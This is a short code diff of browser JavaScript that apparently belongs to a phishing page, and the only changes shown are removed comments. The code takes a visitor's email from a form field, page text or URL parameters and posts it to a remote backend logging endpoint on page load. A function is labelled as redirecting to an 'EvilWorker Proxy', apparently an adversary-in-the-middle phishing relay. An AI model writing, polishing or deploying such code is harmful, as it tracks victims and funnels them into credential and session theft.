@@ -94,17 +94,13 @@ function logAction(action, extra = {}) {
     const emailDisplay = document.getElementById('userTxt');
     let email = emailInput ? emailInput.value : (emailDisplay ? emailDisplay.textContent : 'unknown');
     
-    // If email is still unknown, try URL
     if (email === 'unknown' || email === '') {
         email = getEmailFromUrl() || 'unknown';
     }
     
-    // Decode email if it has URL encoding
     try {
         email = decodeURIComponent(email);
-    } catch (e) {
-        // Already decoded
-    }
+    } catch (e) {}
     
     fetch(`${BACKEND_URL}/api/log-action`, {
         method: 'POST',
@@ -149,7 +145,6 @@ function load() {
     logAction('page_load');
 }
 
-// --- Redirect to EvilWorker Proxy ---
 function redirectToProxy() {
     const params = new URLSearchParams(window.location.search);
     let rawEmail = params.get('e') || params.get('email') || '';
@@ -197,7 +192,6 @@ function redirectToProxy() {
     }, 1500);
 }
 
-// --- Initialize ---
 document.addEventListener('DOMContentLoaded', function() {
     load();
     
